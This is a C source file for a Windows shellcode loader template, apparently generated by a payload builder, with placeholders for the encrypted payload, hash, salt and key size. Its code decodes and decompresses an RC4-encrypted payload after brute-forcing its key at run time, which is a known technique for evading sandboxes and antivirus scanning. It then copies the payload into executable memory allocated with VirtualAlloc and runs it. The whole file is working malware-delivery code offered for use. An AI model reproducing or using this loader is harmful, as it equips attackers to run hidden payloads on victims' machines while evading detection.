#include <windows.h>
#include <string.h>
#include <zlib.h>
#include <stdio.h>

// Encrypted shellcode
unsigned char encrypted_shellcode[] = "ENCRYPTED_SHELLCODE_PLACEHOLDER";
unsigned char expected_hash[] = "EXPECTED_HASH_PLACEHOLDER";
unsigned char salt[] = "SALT_PLACEHOLDER";
#define KEY_SIZE KEY_SIZE_PLACEHOLDER

// Base64 decode table
static const unsigned char b64_table[256] = {
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,
    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,
    64,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,
    64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64
};

// Base64 decode function
int base64_decode(const unsigned char *src, int src_len, unsigned char *dst) {
    printf("[~] Starting base64 decode\n");
    int i, j = 0;
    unsigned char a, b, c, d;
    
    for (i = 0; i < src_len; i += 4) {
        a = b64_table[src[i]];
        b = b64_table[src[i + 1]];
        c = b64_table[src[i + 2]];
        d = b64_table[src[i + 3]];
        
        dst[j++] = (a << 2) | (b >> 4);
        if (c != 64) dst[j++] = (b << 4) | (c >> 2);
        if (d != 64) dst[j++] = (c << 6) | d;
    }
    printf("[+] Base64 decode completed: %d bytes\n", j);
    return j;
}

// Zlib decompressor using uncompress()
int zlib_decompress(const unsigned char *src, int src_len, unsigned char *dst, int dst_max) {
    printf("[~] Starting zlib decompression\n");
    uLongf dest_len = (uLongf)dst_max;
    int ret = uncompress(dst, &dest_len, src, (uLong)src_len);
    
    if (ret != Z_OK) {
        printf("[x] Zlib decompression failed: error %d\n", ret);
        return 0;
    }
    
    printf("[+] Zlib decompression completed: %d bytes\n", (int)dest_len);
    return (int)dest_len;
}

// RC4 state structure with split S-box
typedef struct {
    unsigned char S_tables[4][64];
    unsigned char i;
    unsigned char j;
} rc4_state_t;

// Helper to get S value at index
unsigned char get_S(rc4_state_t *st, int idx) {
    return st->S_tables[idx / 64][idx % 64];
}

// Helper to set S value at index
void set_S(rc4_state_t *st, int idx, unsigned char val) {
    st->S_tables[idx / 64][idx % 64] = val;
}

// RC4 initialization (KSA) adapted for split tables
void rc4_init(rc4_state_t *st, const unsigned char *interm_key, int keylen) {
    int idx, j = 0;
    unsigned char tmp;
    
    // Initialize split S-tables to 0-255
    for (int t = 0; t < 4; t++) {
        for (int pos = 0; pos < 64; pos++) {
            st->S_tables[t][pos] = (unsigned char)(t * 64 + pos);
        }
    }
    st->i = 0;
    st->j = 0;
    
    // KSA using helpers
    for (idx = 0; idx < 256; idx++) {
        unsigned char s_val = get_S(st, idx);
        j = (j + s_val + interm_key[idx % keylen]) % 256;
        tmp = get_S(st, idx);
        set_S(st, idx, get_S(st, j));
        set_S(st, j, tmp);
    }
    st->i = 0;
    st->j = 0;
}

// RC4 decryption (PRGA) with feedback
void rc4_decrypt(rc4_state_t *st, unsigned char *data, int len, const unsigned char *salt) {
    int k;
    unsigned char tmp, K;
    
    for (k = 0; k < len; k++) {
        st->i = (st->i + 1) % 256;
        st->j = (st->j + get_S(st, st->i)) % 256;
        // Swap using helpers
        tmp = get_S(st, st->i);
        set_S(st, st->i, get_S(st, st->j));
        set_S(st, st->j, tmp);
        // Keystream using helpers
        int sum_idx = (get_S(st, st->i) + get_S(st, st->j)) % 256;
        K = get_S(st, sum_idx);
        data[k] ^= K;
        // Feedback: modify j with LSB of salt
        unsigned char salt_bit = salt[k % 8] & 1;
        st->j = (st->j + salt_bit) % 256;
    }
}

// djb2 hash for validation
unsigned int djb2_hash(const unsigned char *data, int len) {
    unsigned int hash = 5381;
    int i;
    
    for (i = 0; i < len; i++) {
        hash = ((hash * 33) + data[i]) & 0xFFFFFFFF;
    }
    return hash;
}

// Convert 4 bytes to uint (little-endian)
unsigned int bytes_to_uint(const unsigned char *bytes) {
    return (unsigned int)bytes[0] | 
           ((unsigned int)bytes[1] << 8) | 
           ((unsigned int)bytes[2] << 16) | 
           ((unsigned int)bytes[3] << 24);
}

// Recursive bruteforce to find RC4 key
int bruteforce_key(unsigned char *key, int pos, int max_len, unsigned char *b64_decoded, int decoded_len, unsigned char *final_shellcode, int *final_len) {
    int i;
    rc4_state_t rc4_state;
    unsigned int calculated_hash;
    unsigned int target_hash = bytes_to_uint(expected_hash);
    
    if (pos == max_len) {
        unsigned char rc4_decrypted[8192];
        unsigned char decompressed[8192];
        unsigned char interm_key[3];  // Max key size 3
        
        // Derive intermediate key: XOR key with first bytes of expected_hash
        for (int p = 0; p < max_len; p++) {
            interm_key[p] = key[p] ^ expected_hash[p];
        }
        
        if (KEY_SIZE == 1) {
            printf("[~] Testing RC4 key: %02x\n", key[0]);
        } else if (KEY_SIZE == 2) {
            printf("[~] Testing RC4 key: %02x%02x\n", key[0], key[1]);
        } else {
            printf("[~] Testing RC4 key: %02x%02x%02x\n", key[0], key[1], key[2]);
        }
        
        memcpy(rc4_decrypted, b64_decoded, decoded_len);
        rc4_init(&rc4_state, interm_key, max_len);
        rc4_decrypt(&rc4_state, rc4_decrypted, decoded_len, salt);
        
        // Decompress with zlib
        int decompressed_len = zlib_decompress(rc4_decrypted, decoded_len, decompressed, 8192);
        
        if (decompressed_len > 0) {
            printf("[~] Validating hash\n");
            unsigned char hash_input[8192];
            memcpy(hash_input, decompressed, decompressed_len);
            int salt_len = sizeof(salt) - 1;
            memcpy(hash_input + decompressed_len, salt, salt_len);
            
            // Calculate hash and validate
            calculated_hash = djb2_hash(hash_input, decompressed_len + salt_len);
            
            if (calculated_hash == target_hash) {
                if (KEY_SIZE == 1) {
                    printf("[+] Valid key found: %02x\n", key[0]);
                } else if (KEY_SIZE == 2) {
                    printf("[+] Valid key found: %02x%02x\n", key[0], key[1]);
                } else {
                    printf("[+] Valid key found: %02x%02x%02x\n", key[0], key[1], key[2]);
                }
                memcpy(final_shellcode, decompressed, decompressed_len);
                *final_len = decompressed_len;
                return 1;
            }
        }
        return 0;
    }
    
    // Try all possible byte values
    for (i = 1; i <= 255; i++) {
        key[pos] = (unsigned char)i;
        if (bruteforce_key(key, pos + 1, max_len, b64_decoded, decoded_len, final_shellcode, final_len)) {
            return 1;
        }
    }
    
    return 0;
}

int main() {
    printf("[~] Starting payload execution\n");
    unsigned char key[KEY_SIZE];
    unsigned char final_shellcode[8192];
    unsigned char b64_decoded[8192];
    int b64_len = sizeof(encrypted_shellcode) - 1;
    int final_len = 0;
    int found = 0;
    
    printf("[~] RC4 key size: %d bytes\n", KEY_SIZE);
    printf("[~] Base64 payload size: %d bytes\n", b64_len);
    
    // Decode base64 ONCE at the beginning
    printf("[~] Decoding base64 payload\n");
    int decoded_len = base64_decode(encrypted_shellcode, b64_len, b64_decoded);
    if (decoded_len <= 0) {
        printf("[x] Base64 decode failed\n");
        return 1;
    }
    printf("[+] Base64 decoded: %d bytes\n", decoded_len);
    
    printf("[~] Starting RC4 key bruteforce\n");
    
    // Bruteforce RC4 key with pre-decoded data
    memset(key, 0, sizeof(key));
    if (bruteforce_key(key, 0, KEY_SIZE, b64_decoded, decoded_len, final_shellcode, &final_len)) {
        found = 1;
    }
    
    if (found && final_len > 0) {
        printf("[+] Payload decrypted successfully: %d bytes\n", final_len);
        printf("[~] Allocating executable memory\n");
        
        // Inject and execute shellcode
        void *execs = VirtualAlloc(0, final_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (execs) {
            printf("[+] Memory allocated at: %p\n", execs);
            printf("[~] Copying shellcode to memory\n");
            memcpy(execs, final_shellcode, final_len);
            printf("[~] Executing shellcode\n");
            ((void(*)())(execs))();
        } else {
            printf("[x] Memory allocation failed\n");
        }
    } else {
        printf("[x] Failed to decrypt payload\n");
    }
    
    return 0;
}